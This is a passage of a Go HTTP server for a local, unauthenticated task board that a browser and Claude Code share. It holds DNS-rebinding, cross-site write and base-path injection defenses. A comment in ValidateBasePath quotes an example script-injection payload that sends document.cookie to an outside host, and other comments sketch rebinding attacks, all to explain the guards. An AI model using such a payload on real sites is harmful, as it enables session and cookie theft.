// server.go — the HTTP surface.
//
//	GET  /             aboard.html, with the base path injected
//	GET  /aboard.json   current state
//	POST /aboard.json   write state to disk (compare-and-set)
//	GET  /events       SSE stream; pings whenever the state file changes on disk
//	GET  /wait         block until the board is poked (wait.go)
//	POST /poke         release every session waiting on this board (wait.go)
//	GET  /waiters      who is waiting right now (wait.go)
//	GET  /capabilities what this board can do, from views/*.spec.json (caps.go)
//	GET  /journal      recent accepted writes (journal.go)
//	GET  /watch        those writes as JSON lines, as they happen (journal.go)
//	POST /log          append output to a tab's sidecar log (logs.go)
//	GET  /log          the tail of one (logs.go)
//	POST /upload       an image pasted or dropped by the human (upload.go)
//	GET  /uploads/<f>  serve one, from disk — uploads arrive after the build
//	GET  /<file>       static assets (views/, lib/, assets/, test/, app.css)
//
// The UI is compiled into the binary (pkg/aboard/web), so shipping the board is
// copying one file. The state file is deliberately NOT embedded: it is the
// shared document that both the browser and Claude Code read and write on disk.
//
// The file watcher polls a content hash rather than using an OS watcher. That
// keeps the dependency list to cobra and, unlike a single-file watch, it survives
// an editor that saves by rename.

package aboard

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/fs"
	"math"
	"math/rand/v2"
	"mime"
	"net"
	"net/http"
	"os"
	"path"
	"regexp"
	"runtime/debug"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/exoport/aboard/pkg/aboard/web"
)

const maxBodyBytes = 8 << 20 // 8 MiB

var (
	serveDirs  = []string{"views", "lib", "assets", "test"}
	serveFiles = []string{"app.css", "aboard.html"}
)

// WebFS is the embedded web tree. Exported so a host can serve the same assets,
// and so `--dev` has something to be an alternative TO.
func WebFS() fs.FS { return web.FS }

// Instance describes a running board. It is written under `.aboard/run/` so
// restart.sh can stop exactly this project's board (not every board on the
// machine), and so an agent can find the URL without being told.
type Instance struct {
	// App is the identity of the process serving: HostStandalone or HostApe.
	// A client uses it to recognise a board on a port; it is deliberately NOT
	// AppName, which describes the board rather than its host.
	App     string `json:"app"`
	Host    string `json:"host"`
	Argv0   string `json:"argv0,omitempty"`
	Version string `json:"version"`
	Built   string `json:"built,omitempty"`
	Project string `json:"project"`
	Name    string `json:"name,omitempty"`
	Port    int    `json:"port"`
	URL     string `json:"url"`
	// Base is the URL prefix the board is served under, "" for the server root.
	Base  string `json:"base,omitempty"`
	State string `json:"state"`
	PID   int    `json:"pid"`

	Started string `json:"started"`
}

// ServeConfig is everything `aboard serve` decided before the engine starts.
type ServeConfig struct {
	Root Root
	Name string
	// StateFile overrides Root.StateFile(Name) when non-empty.
	StateFile string
	Port      int
	Dev       bool
	// DevDir is the web tree to serve under Dev; empty means Root.DevDir().
	DevDir string
	// BasePath is a URL prefix such as "/aboard", or "" for the server root.
	BasePath string
}

type server struct {
	opts      Options
	root      Root
	stateFile string
	assets    fs.FS
	dev       bool
	port      int
	base      string
	instance  Instance

	mu       sync.Mutex
	clients  map[chan string]struct{}
	watchers map[chan string]struct{} // `aboard watch` consumers (journal.go)

	// writeMu serialises the whole read → compare-and-set → reconcile → write
	// span of a POST (see commitState). A SEPARATE lock from s.mu on purpose:
	// s.mu guards the two subscriber maps, which every broadcast touches, and
	// reusing it here would park every SSE frame behind a disk write. They also
	// nest in one direction only — writeMu may be held while taking s.mu, never
	// the reverse — which is what keeps the pair deadlock-free.
	writeMu sync.Mutex

	// Sessions blocked on /wait, released by the human's notify button or by
	// another session's poke (see wait.go).
	waits *waitHub

	// Signature of the UI being served, so an open page can notice its own code
	// changed and reload itself (see reload.go).
	ui *uiWatcher

	// Append-only record of every accepted write (see journal.go).
	journal *journal

	// Set by a POST so the browser that made the write can recognise the echo
	// of its own change and skip reloading. Cleared on every broadcast.
	pendingOrigin string
}

// NormalizeBasePath reduces a --base-path to the one form the router and the
// browser both expect: empty, or a leading slash with no trailing one.
//
// Both ends have to agree exactly, and the failure when they do not is a blank
// page with a 404 in a console nobody opened — so the normalisation is a named
// function with a test rather than a regexp repeated at two call sites.
func NormalizeBasePath(raw string) string {
	trimmed := strings.Trim(strings.TrimSpace(raw), "/")
	if trimmed == "" {
		return ""
	}
	return "/" + trimmed
}

// basePathRe is what a URL prefix may contain: one or more `/segment`, each
// segment made of the characters a path segment can hold without being escaped.
// A segment must contain at least one character that is not a dot, so `.` and
// `..` are refused — dots are in the class because `v1.2` is a reasonable
// prefix, and that is exactly what lets `..` through if nothing says otherwise.
var basePathRe = regexp.MustCompile(`^(/[A-Za-z0-9._~-]*[A-Za-z0-9_~-][A-Za-z0-9._~-]*)+$`)

// ValidateBasePath refuses a --base-path that cannot be one.
//
// This is not hygiene. `serveShell` splices the normalised value into the shell
// as `window.ABOARD_BASE = "<base>";` — inside a JS STRING LITERAL — and
// NormalizeBasePath only trimmed slashes, so a `"` closed the literal and
// everything after it ran on the board's own origin:
//
//	--base-path '/brd";fetch("http://elsewhere/?"+document.cookie)//'
//
// The flag belongs to whoever starts the server, so this is not a route in from
// outside; it is the shape of thing that becomes one the moment a wrapper builds
// the flag from something it read. Refused up front, as ValidateBoardName is,
// rather than escaped at the splice: a base path with a quote in it is not a
// base path, and there is exactly one place that decides so.
//
// `..` is refused by the same rule, since a segment of dots is not in the
// character class. A prefix containing `..` is not a traversal — the router
// strips it as a literal — but it is nonsense that would have to be explained.
func ValidateBasePath(raw string) error {
	base := NormalizeBasePath(raw)
	if base == "" {
		return nil
	}
	if !basePathRe.MatchString(base) {
		return fmt.Errorf("base path %q is not usable: it must be one or more /segments of letters, digits, %s",
			raw, "dot, underscore, tilde or hyphen, and no segment may be `.` or `..` — for example /aboard")
	}
	return nil
}

// Serve runs the board until the context is cancelled or the server fails.
//
// Everything it needs is in cfg and opts: it reads no flags, no environment and
// no os.Args, which is what lets ape mount the same call behind its own command.
func Serve(ctx context.Context, opts Options, cfg ServeConfig) error {
	logger := opts.Log()

	// Before anything binds or is written: an unusable base path would otherwise
	// reach serveShell's splice.
	if err := ValidateBasePath(cfg.BasePath); err != nil {
		return err
	}

	stateFile := cfg.StateFile
	if stateFile == "" {
		stateFile = cfg.Root.StateFile(cfg.Name)
	}
	if _, err := os.Stat(stateFile); err != nil {
		// Naming the path it looked for AND the command that creates it. The
		// commonest cause is a project that has a `.aboard/` but no document in
		// it, and "no such file" without the path sends the reader to grep the
		// source; a path without a command sends them to write the JSON by hand,
		// which is how a document with the wrong `version` gets into a board.
		hint := "aboard init"
		if cfg.Name != "" {
			hint += " --name " + cfg.Name
		}
		return fmt.Errorf("no board document at %s — run `%s` in %s", stateFile, hint, cfg.Root)
	}

	// .js must be text/javascript or the browser refuses the ES modules; some
	// systems' /etc/mime.types disagree, so state it rather than inherit it.
	for ext, typ := range map[string]string{
		".js":   "text/javascript; charset=utf-8",
		".mjs":  "text/javascript; charset=utf-8",
		".css":  "text/css; charset=utf-8",
		".html": "text/html; charset=utf-8",
		".svg":  "image/svg+xml",
		".json": "application/json",
	} {
		if err := mime.AddExtensionType(ext, typ); err != nil {
			logger.Printf("mime %s: %v", ext, err)
		}
	}

	var assets fs.FS = web.FS
	if cfg.Dev {
		dir := cfg.DevDir
		if dir == "" {
			dir = cfg.Root.DevDir()
		}
		// --dev-dir names a tree that need not be under the project root at all,
		// so Root has no opinion about it — but the join still goes through
		// layout.go, which is the only file that joins a path. Probing for
		// aboard.html turns "--dev silently served nothing" into a message that
		// names the directory it looked in.
		if _, err := os.Stat(DevWebFile(dir, "aboard.html")); err != nil {
			return fmt.Errorf("--dev found no web tree at %s (pass --dev-dir)", dir)
		}
		assets = os.DirFS(dir)
	}

	srv := &server{
		opts:      opts,
		root:      cfg.Root,
		stateFile: stateFile,
		assets:    assets,
		dev:       cfg.Dev,
		base:      NormalizeBasePath(cfg.BasePath),
		clients:   map[chan string]struct{}{},
		watchers:  map[chan string]struct{}{},
		waits:     newWaitHub(),
		ui:        newUIWatcher(cfg.Dev),
		journal:   newJournal(cfg.Root),
	}

	listener, chosen, err := srv.listen(ctx, cfg.Port, cfg.Root, cfg.Name)
	if err != nil {
		return err
	}

	srv.port = chosen
	if err := srv.writeInstance(cfg.Root, cfg.Name); err != nil {
		logger.Printf("warning: could not record the instance file: %v", err)
	}
	defer srv.removeInstance()

	go srv.guard("state watcher", srv.watch)
	go srv.guard("ui watcher", srv.watchUI)

	mux := http.NewServeMux()
	mux.HandleFunc("/", srv.route)

	mode := "embedded UI"
	if cfg.Dev {
		mode = "UI from disk (dev)"
	}
	label := ""
	if cfg.Name != "" {
		label = "  [" + cfg.Name + "]"
	}
	logger.Printf("aboard  ->  %s%s   (%s, %s)", srv.instance.URL, label, mode, VersionString())
	logger.Printf("state  ->  %s", srv.stateFile)
	logger.Printf("project->  %s", cfg.Root)
	logger.Printf(`In VS Code: Ctrl/Cmd+Shift+P -> "Simple Browser: Show" -> paste the URL above.`)

	httpSrv := &http.Server{
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second,
	}

	// Remove the instance file on Ctrl-C too, not only on a clean return, so a
	// stale record never points at a dead process. The context is the cli
	// layer's signal-cancelled one.
	done := make(chan struct{})
	go func() {
		select {
		case <-ctx.Done():
			srv.removeInstance()
			_ = httpSrv.Close()
		case <-done:
		}
	}()
	defer close(done)

	if err := httpSrv.Serve(listener); err != nil && !errors.Is(err, http.ErrServerClosed) {
		return err
	}
	return nil
}

// listen binds the project's port. An explicit port is taken literally. Port 0
// means "derive one from the project root", then walk forward if that exact port
// is already busy — but if the occupant turns out to be this project's own
// board, say so and stop instead of starting a duplicate.
//
// Duplicate detection runs FIRST, whichever way the port was chosen. It used to
// live only in the derive-and-walk loop, so `--port` (and `PORT`) skipped it
// entirely: a second server started happily on the same state file, rewrote
// `instance.json` to point at itself, and killing it left every client command
// aimed at a dead port while a perfectly healthy board went on serving. The
// duplicate is the thing being prevented, and the duplicate does not care how
// its port was picked — the check belongs to the project, not to the branch.
func (s *server) listen(ctx context.Context, want int, root Root, name string) (net.Listener, int, error) {
	var lc net.ListenConfig
	if want != 0 {
		if err := s.refuseDuplicate(ctx, root, name, want); err != nil {
			return nil, 0, err
		}
		ln, err := lc.Listen(ctx, "tcp", fmt.Sprintf("127.0.0.1:%d", want))
		if err != nil {
			return nil, 0, fmt.Errorf("port %d is busy: %w", want, err)
		}
		return ln, want, nil
	}

	first := DerivePort(root, name)
	for i := range portTries {
		p := portBase + ((first - portBase + i) % portSpan)
		ln, err := lc.Listen(ctx, "tcp", fmt.Sprintf("127.0.0.1:%d", p))
		if err == nil {
			return ln, p, nil
		}
		if err := s.refuseDuplicate(ctx, root, name, p); err != nil {
			return nil, 0, err
		}
		s.opts.Log().Printf("port %d busy, trying %d", p, portBase+((first-portBase+i+1)%portSpan))
	}
	return nil, 0, fmt.Errorf("no free port found in %d-%d after %d tries", portBase, portBase+portSpan-1, portTries)
}

// refuseDuplicate reports an error when THIS project's board already holds the
// port, and nothing otherwise — a stranger on the port is somebody else's
// business, and on the derived path the loop walks past it.
func (s *server) refuseDuplicate(ctx context.Context, root Root, name string, port int) error {
	other := probeOccupant(ctx, root, name, port)
	if other == nil || other.Project != root.String() || other.Name != name {
		return nil
	}
	return fmt.Errorf("this project's board is already running at %s (pid %d)", other.URL, other.PID)
}

// What a probe will spend on an occupant that may not be a board at all: a
// local connection either answers in well under this or is not listening, and
// the reply is a one-line instance record.
const (
	probeTimeout   = 400 * time.Millisecond
	probeReadLimit = 4 << 10
)

// ProbeBoard asks whoever holds a port whether they are a board, and whose.
//
// It accepts EITHER identity, because a project's board may have been started by
// the standalone binary or by ape and a client has no way to know which — and
// the point of the probe is to recognise a board, not to police who launched it.
//
// base is the URL prefix the occupant is served under, "" for the server root.
// It is a parameter and not an assumption because a board started with
// --base-path answers at <base>/health and NOWHERE else: probing the bare root
// made `aboard status` report a live prefixed board as a stale record, which is
// the one sentence that sends a session off to restart a healthy server.
func ProbeBoard(ctx context.Context, port int, base string) *Instance {
	client := &http.Client{Timeout: probeTimeout}
	url := fmt.Sprintf("http://127.0.0.1:%d%s/health", port, NormalizeBasePath(base))
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, http.NoBody)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer func() { _ = resp.Body.Close() }()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	var got Instance
	if json.NewDecoder(io.LimitReader(resp.Body, probeReadLimit)).Decode(&got) != nil {
		return nil
	}
	if got.App != HostStandalone && got.App != HostApe {
		return nil
	}
	return &got
}

// probeOccupant asks who holds a port when this project wants it, and is the
// only caller that has to GUESS a base path: the bare root is tried first, and
// then — only if this project has a record on that very port — the base that
// record names. Without the second try a prefixed board fails to recognise
// ITSELF on restart and quietly starts a duplicate one port along, which is the
// exact failure the recognition exists to prevent.
func probeOccupant(ctx context.Context, root Root, name string, port int) *Instance {
	if inst := ProbeBoard(ctx, port, ""); inst != nil {
		return inst
	}
	rec, err := RunningInstance(root, name)
	if err != nil || rec.Port != port || rec.Base == "" {
		return nil
	}
	return ProbeBoard(ctx, port, rec.Base)
}

func (s *server) writeInstance(root Root, name string) error {
	if err := os.MkdirAll(root.RunDir(), 0o755); err != nil {
		return err
	}
	s.instance = Instance{
		App:     s.opts.HostID(),
		Host:    s.opts.HostID(),
		Argv0:   s.opts.Argv0,
		Version: VersionString(),
		Built:   BuildStamp(),
		Project: root.String(),
		Name:    name,
		Port:    s.port,
		URL:     fmt.Sprintf("http://localhost:%d%s", s.port, s.base),
		Base:    s.base,
		State:   s.stateFile,
		PID:     os.Getpid(),
		Started: time.Now().UTC().Format(time.RFC3339),
	}
	body, err := json.MarshalIndent(s.instance, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(root.InstanceFile(name), append(body, '\n'), 0o644) //nolint:gosec // 0o644 is the board's repo-wide file-mode policy; see the note in init.go
}

func (s *server) removeInstance() {
	// Only clear the record if it is still ours, so a restart that already
	// overwrote it is not undone by this process exiting afterwards.
	p := s.root.InstanceFile(s.instance.Name)
	body, err := os.ReadFile(p)
	if err != nil {
		return
	}
	var got Instance
	if json.Unmarshal(body, &got) == nil && got.PID != os.Getpid() {
		return
	}
	_ = os.Remove(p)
}

// RunningInstance finds the board every client-side command talks to. One
// lookup, so they all fail the same recognisable way when nothing is running.
func RunningInstance(root Root, name string) (Instance, error) {
	var inst Instance
	p := root.InstanceFile(name)
	rec, err := os.ReadFile(p)
	if err != nil {
		return inst, fmt.Errorf("no running board found (%s); start it with `aboard serve`", p)
	}
	if err := json.Unmarshal(rec, &inst); err != nil {
		return inst, fmt.Errorf("unreadable instance file %s", p)
	}
	return inst, nil
}

/* ---------- routing ---------- */

// The board has no authentication: anything that can reach the port can read and
// rewrite the whole board. Loopback-only binding is the containment, and these
// two checks are what stop a BROWSER from being the thing that reaches it on an
// attacker's behalf.
//
// hostAllowed is the DNS-rebinding guard. The bind is 127.0.0.1, but a name that
// resolves to 127.0.0.1 reaches it just as well, and a page served from that name
// is then SAME-ORIGIN with the board: it can read `/aboard.json`, `/journal` and
// `/health`, which discloses the absolute project path and the pid. The Host
// header is the only thing that distinguishes the two, so it is checked before
// anything else looks at the request.
//
// The allow-list is the three spellings of loopback, with or without a port. A
// name is NOT accepted just because it resolves to loopback — that is exactly the
// attack — and there is deliberately no flag to widen it: a board reached under
// another name is a board that has left the machine it was designed for.
func hostAllowed(raw string) bool {
	if raw == "" {
		return false
	}
	host := raw
	if h, _, err := net.SplitHostPort(raw); err == nil {
		host = h
	}
	host = strings.TrimSuffix(strings.TrimPrefix(host, "["), "]")
	switch strings.ToLower(host) {
	case "localhost", "127.0.0.1", "::1":
		return true
	}
	return false
}

// mutating reports that this request would change something, so it has to prove
// it did not come from another site.
func mutating(method string) bool {
	switch method {
	case http.MethodGet, http.MethodHead, http.MethodOptions:
		return false
	}
	return true
}

// crossSite decides whether a mutating request came from somewhere else, and
// says which signal refused it.
//
// Two signals, because neither alone is enough. `Sec-Fetch-Site: cross-site` is
// the browser's own account of where the request came from and it cannot be set
// by page script; `Origin` catches the browsers and the versions that do not send
// the fetch-metadata headers. Both are absent from curl and from `apply`, and
// that is the case that must keep working: this is not authentication — the
// server has none and cannot have any — it is a same-origin rule for the one
// client that lies about who it is acting for.
//
// What passes: `same-origin`, `same-site`, `none` (a user typing the URL), no
// header at all, and an `Origin` that is this server's own. What is refused: a
// page on another origin POSTing to the board, which was reproduced in headless
// Chromium wiping the board from a different local port.
func crossSite(r *http.Request) string {
	if r.Header.Get("Sec-Fetch-Site") == "cross-site" {
		return "Sec-Fetch-Site: cross-site"
	}
	origin := r.Header.Get("Origin")
	switch origin {
	case "":
		// curl, `apply`, any non-browser client. Nothing to check and nothing to
		// gain by demanding one: a program that wanted to lie could send any
		// value at all. The signal is only worth anything from a browser, which
		// sets it itself.
		return ""
	case "http://" + r.Host, "https://" + r.Host:
		return ""
	}
	// `null` lands here too, and deliberately: an opaque origin is a sandboxed
	// frame or a data: URL, and neither is this board's own page. The html tab
	// frames are exactly that shape, and they reach the board through
	// postMessage to the parent, never with a request of their own.
	return "Origin: " + origin
}

func (s *server) route(w http.ResponseWriter, r *http.Request) {
	if !hostAllowed(r.Host) {
		// 403 rather than 421. 421 says "I am not the right server for this
		// authority", which invites a client to retry on a fresh connection —
		// and a browser following that advice would hammer the board. This is a
		// deliberate refusal, not a misdirection, so it says so.
		http.Error(w, "refused: this board answers only on localhost, 127.0.0.1 or [::1] — "+
			"a hostname that merely resolves to loopback is how a page on another site reads a local board", http.StatusForbidden)
		return
	}
	if mutating(r.Method) {
		if why := crossSite(r); why != "" {
			http.Error(w, "refused: this write did not come from the board's own page ("+why+") — "+
				"the board has no authentication, so a cross-site write is refused rather than trusted", http.StatusForbidden)
			return
		}
	}

	// Strip the base path before anything looks at the path, so every case below
	// is written against the server root and there is one place that knows a
	// prefix exists at all.
	upath := r.URL.Path
	if s.base != "" {
		switch {
		case upath == s.base:
			// Without the trailing slash every relative URL in the shell — the
			// stylesheet, the module imports — would resolve one level too high.
			http.Redirect(w, r, s.base+"/", http.StatusMovedPermanently)
			return
		case strings.HasPrefix(upath, s.base+"/"):
			upath = strings.TrimPrefix(upath, s.base)
		default:
			http.Error(w, "not found", http.StatusNotFound)
			return
		}
	}

	if s.routeAPI(w, r, upath) {
		return
	}
	s.routeUI(w, r, upath)
}

// routeAPI handles the endpoints something other than a browser page talks to:
// the state document, the notify channel, the journal, the log sink, uploads.
// It reports whether it recognised the path, so route can fall through to the
// UI half rather than 404 twice.
//
// Split from routeUI because one switch carrying both measured 40 branches, and
// the two halves have different rules: everything here answers a client and
// names its method, everything there serves a file to a page.
func (s *server) routeAPI(w http.ResponseWriter, r *http.Request, upath string) bool {
	switch {
	case upath == "/aboard.json" && r.Method == http.MethodGet:
		s.getState(w)
	case upath == "/aboard.json" && r.Method == http.MethodPost:
		s.postState(w, r)
	case upath == "/health" && r.Method == http.MethodGet:
		s.writeJSON(w, http.StatusOK, s.instance)
	case upath == "/events" && r.Method == http.MethodGet:
		s.events(w, r)
	case upath == "/wait" && r.Method == http.MethodGet:
		s.handleWait(w, r)
	case upath == "/poke" && r.Method == http.MethodPost:
		s.handlePoke(w, r)
	case upath == "/waiters" && r.Method == http.MethodGet:
		s.handleWaiters(w, r)
	case upath == "/capabilities" && r.Method == http.MethodGet:
		s.handleCapabilities(w, r)
	case upath == "/journal" && r.Method == http.MethodGet:
		s.handleJournal(w, r)
	case upath == "/watch" && r.Method == http.MethodGet:
		s.handleWatch(w, r)
	case upath == "/log" && r.Method == http.MethodPost:
		s.handleLogPost(w, r)
	case upath == "/log" && r.Method == http.MethodGet:
		s.handleLogGet(w, r)
	case upath == "/upload" && r.Method == http.MethodPost:
		s.handleUpload(w, r)
	case upath == "/uploads" && r.Method == http.MethodGet:
		s.handleUploads(w, r)
	default:
		return false
	}
	return true
}

// routeUI serves what a page asks for: the shell, an html tab's sandboxed
// frame, an uploaded image, and the embedded (or --dev on-disk) assets.
func (s *server) routeUI(w http.ResponseWriter, r *http.Request, upath string) {
	switch {
	// GET, like every other case here. It had no method check at all, so
	// `POST /` returned the whole shell with a 200 — harmless, since nothing in
	// the browser executes anything, but it made the reference's "any method not
	// listed for a matched path is 404" false, and a rule with a known exception
	// is one nobody trusts the rest of.
	case (upath == "/" || upath == "/aboard.html") && r.Method == http.MethodGet:
		s.serveShell(w, r)
	case strings.HasPrefix(upath, "/tab/") && strings.HasSuffix(upath, "/html") && r.Method == http.MethodGet:
		id := strings.TrimSuffix(strings.TrimPrefix(upath, "/tab/"), "/html")
		s.serveTabHTML(w, r, id)
	case strings.HasPrefix(upath, "/"+uploadDir+"/") && r.Method == http.MethodGet:
		s.serveUpload(w, strings.TrimPrefix(upath, "/"+uploadDir+"/"))
	case r.Method == http.MethodGet:
		s.static(w, r, upath)
	default:
		http.Error(w, "not found", http.StatusNotFound)
	}
}

/* ---------- state ---------- */

func (s *server) getState(w http.ResponseWriter) {
	body, err := os.ReadFile(s.stateFile)
	if err != nil {
		http.Error(w, "cannot read state", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")
	_, _ = w.Write(body)
}

func (s *server) postState(w http.ResponseWriter, r *http.Request) {
	raw, err := io.ReadAll(http.MaxBytesReader(w, r.Body, maxBodyBytes))
	if err != nil {
		s.writeJSON(w, http.StatusBadRequest, map[string]string{"error": "body too large or unreadable"})
		return
	}

	// Decode into an ordered-ish generic map. Field order in the written file is
	// whatever encoding/json produces (alphabetical); the board does not care,
	// and it keeps diffs stable between writes.
	var incoming map[string]any
	if err := json.Unmarshal(raw, &incoming); err != nil {
		s.writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid json"})
		return
	}
	if _, ok := incoming["tabs"].([]any); !ok {
		s.writeJSON(w, http.StatusBadRequest, map[string]string{"error": "expected a tabs array"})
		return
	}

	origin, _ := incoming["__origin"].(string)
	if origin == "" {
		origin = "browser"
	}
	base, baseOK := baseToken(incoming["__base"])
	if !baseOK {
		// A `__base` that is present but not a token is refused rather than
		// ignored. Ignoring it is the whole defect this token exists to close:
		// the caller believes it asked for compare-and-set, the server silently
		// did not, and the 200 says the write was fine.
		s.writeJSON(w, http.StatusBadRequest, map[string]string{
			"error":  "invalid __base",
			"reason": "__base must be the `rev` of the document you read, as a number or its decimal string",
		})
		return
	}
	// An ABSENT __by is "unknown", NOT "human".
	//
	// It used to default to "human", and "human" is not a label here — it is the
	// key every guarantee in tabs.go keys off. A write stamped human may delete
	// tabs, clear the change markers that tell the human something happened, and
	// drop chat acks. So a bare POST with no __by at all — a curl, a script, a
	// half-written tool — was handed all three: one request could empty the board
	// and leave no dot, no removal request and no trace that anything had been
	// hidden.
	//
	// The browser always sends it explicitly (aboard.html's pushDoc builds
	// `{ ...doc, __origin, __base, __by: 'human' }`), and `aboard apply --by
	// human` is refused outright, so nothing that legitimately holds human powers
	// relies on the default. Which means the default's only remaining job is to
	// name a caller that did not say who it was — and the safe answer to that is
	// an agent-level one.
	by, _ := incoming["__by"].(string)
	if by == "" {
		by = actorUnknown
	}
	delete(incoming, "__origin")
	delete(incoming, "__base")
	delete(incoming, "__by")

	res, bad := s.commitState(incoming, raw, base, by, origin)
	if bad != nil {
		s.writeJSON(w, bad.code, bad.body)
		return
	}

	// Publishing happens OUTSIDE the write lock, and the ordering is the reason:
	// the journal entry is on disk before any of this runs, so a watcher that
	// reacts instantly cannot arrive before the record of what it is reacting to.
	// Releasing a waiter can also fan out to every open page, and none of that
	// wants the next writer queued behind it.
	if len(res.entry.Tabs) > 0 {
		s.notifyWatchers(res.entry)
		if released := s.waits.releaseMatching(res.doc, res.entry); released > 0 {
			s.opts.Log().Printf("released %d waiting session(s) on: %s", released, joinOr(res.entry.Tabs, "no tab"))
			s.broadcastWaiters()
		}
	}

	s.writeJSON(w, http.StatusOK, map[string]any{"ok": true, "rev": res.rev, "updatedAt": res.stamp})
}

// commitResult is what an accepted write hands back to the unlocked half of
// postState: the document as it reached disk, the one change summary its three
// consumers share, and the stamp the caller is told about.
type commitResult struct {
	doc   []byte
	entry JournalEntry
	stamp string
	rev   int
}

// apiError is a refusal the caller still has to write. The locked half returns
// one rather than writing the reply itself, so the write lock is never held
// while talking to a client.
type apiError struct {
	code int
	body map[string]string
}

// commitState is read → compare-and-set → reconcile → write, as ONE critical
// section.
//
// It used to be none: the file was read, the CAS compared, the tabs reconciled
// and the result renamed into place with no mutual exclusion at all, so two
// overlapping POSTs both read the same `updatedAt`, both passed the check, and
// both wrote — 40 of 40 barrier-synchronised trials returned two 200s with one
// edit gone from disk, and the journal recorded the lost write as if it had
// landed. Compare-and-set cannot work across a window it does not cover: the
// comparison and the write have to be indivisible or the comparison is advice.
//
// This lock only covers THIS process. Two servers on one state file would still
// race, which is why `aboard serve` refuses a duplicate rather than trusting the
// file, and why `apply` posts to the running board instead of writing the file
// itself — every writer that matters arrives through this function.
func (s *server) commitState(incoming map[string]any, raw []byte, base, by, origin string) (commitResult, *apiError) {
	s.writeMu.Lock()
	defer s.writeMu.Unlock()

	currentRaw, _ := os.ReadFile(s.stateFile)

	// Compare-and-set against the REVISION, not the clock. See revisionOf.
	live := revisionOf(currentRaw)
	if base != "" && len(currentRaw) > 0 {
		if bad := live.refuse(base); bad != nil {
			return commitResult{}, bad
		}
		// Only for a base that really is a timestamp: a legacy document can also
		// be written against a numeric base of 0, and calling that a timestamp
		// would be a wrong sentence in the log of the one case nobody can re-run.
		if _, notANumber := strconv.Atoi(strings.TrimSpace(base)); live.legacy() && notANumber != nil {
			s.opts.Log().Printf("accepted a timestamp __base on a document with no rev — "+
				"this board has not been written since the revision token landed; %q gets rev %d", by, live.rev+1)
		}
	}

	// Tab-level guarantees: an agent may not delete a tab or clear a change
	// marker, and every tab it did change gets stamped so the UI can show a dot.
	tabs, err := reconcileTabs(currentRaw, raw, by, s.opts.Log())
	if err != nil {
		return commitResult{}, &apiError{http.StatusBadRequest, map[string]string{"error": err.Error()}}
	}
	incoming["tabs"] = tabs

	// Ids are board-wide monotonic; never let the counter regress or fall behind
	// the ids already in use (see ids.go).
	incoming["nextId"] = reconcileNextID(raw, currentRaw)

	// The schema version is ours to state, not the caller's. This server writes
	// version-3 documents by definition — it IS the v3 server — so a `version` in
	// the submitted body is at best a copy of what was read and at worst a copy of
	// a stale example. It used to be written through verbatim, and an agent that
	// copied "version": 2 out of the skill's own schema.md got `applied`, exit 0,
	// and a board that blanked itself in front of the human one round trip later:
	// aboard.html refuses to render a document whose version it does not know. The
	// agent found out last, from the human, which is exactly backwards.
	//
	// Stamped rather than refused, for the same reason nextId is reconciled rather
	// than rejected: the CONTENT was fine, and failing a good write over a field
	// the caller should never have set is the worse trade. The agent is still told
	// — Apply warns on stderr (see wrongVersion) — so the stale source gets
	// fixed by whoever is still holding the context for it.
	incoming["version"] = SchemaVersion

	// The compare-and-set token. Server-managed exactly like `version` and for a
	// sharper reason: `updatedAt` was the token, and it is a millisecond clock —
	// 4 collisions in 60 sequential writes, and every collision is a provably
	// stale base that passes. A counter cannot collide, and the loser of a race
	// is told a number it can compare rather than a timestamp it has to trust.
	incoming["rev"] = live.rev + 1

	stamp := time.Now().UTC().Format("2006-01-02T15:04:05.000Z")
	incoming["updatedAt"] = stamp
	incoming["lastEditedBy"] = by

	out, err := json.MarshalIndent(incoming, "", "  ")
	if err != nil {
		return commitResult{}, &apiError{http.StatusInternalServerError, map[string]string{"error": "encode failed"}}
	}
	out = append(out, '\n')

	// One comparison, three consumers: the journal on disk, the watch stream,
	// and any session blocked on a predicate about this very change.
	entry := changeSummary(currentRaw, tabs, by, origin)

	if err := s.writeAtomic(out); err != nil {
		return commitResult{}, &apiError{http.StatusInternalServerError, map[string]string{"error": "write failed"}}
	}

	s.mu.Lock()
	s.pendingOrigin = origin
	s.mu.Unlock()

	// The journal append stays inside the lock with the write it records. Outside
	// it, two writers could rename in one order and append in the other, and the
	// journal is the record a session reads to reconstruct what happened — an
	// order it invented would be worse than no record at all.
	if len(entry.Tabs) > 0 {
		s.journal.append(entry)
	}

	return commitResult{doc: out, entry: entry, stamp: stamp, rev: live.rev + 1}, nil
}

// revision is the board's compare-and-set token as it stands on disk: a counter
// the server increments on every accepted write.
//
// `updatedAt` used to be the token, and a millisecond timestamp is not one. Two
// writes inside the same millisecond produce the same string, so a base built
// from the first one still matches after the second landed — measured at 4
// collisions in 60 sequential writes, after which a provably stale base passes
// the check and the human's edit is gone with a 200 to say it went well. The
// clock also runs backwards (NTP, a suspend, a container clock), which the
// comparison has no way to notice.
//
// A counter has neither problem, and it is comparable and cheap to print, which
// the hash alternative (stateSignature, already computed for the SSE frames) is
// not: sha256 would have been equally correct as an equality token, but "your
// base is rev 12, the board is at rev 14" tells a reader they are two writes
// behind, and "9f3a… != c17b…" tells them nothing.
//
// `updatedAt` stays, unchanged, because it answers a different question — WHEN,
// for a human reading the file — and nothing keys off it any more.
type revision struct {
	rev int
	// had reports whether the document on disk carried a `rev` at all. A board
	// written before this landed has none, and its stored `updatedAt` is the only
	// base its readers could have. See refuse.
	had       bool
	updatedAt string
}

// baseToken reads `__base` off the incoming document, and reports whether the
// value is one a comparison can be made from.
//
// It takes a NUMBER as readily as a string, and that is the point rather than a
// convenience. `rev` is a JSON number in the document, so the obvious thing for a
// caller assembling a write by hand is `"__base": doc.rev` — and until this
// existed the string type assertion failed, the base came out empty, and the
// server skipped compare-and-set altogether and answered 200. That is precisely
// the silent-clobber the revision token was introduced to end, one JSON type
// away, and it was reachable only AFTER the token stopped being a string.
//
// Absent or null is "no base", which is still an unconditional write and still
// legitimate (`apply --force`, a seeding script). Anything else — a bool, an
// object, a fractional number — is a caller that meant to set a base and got it
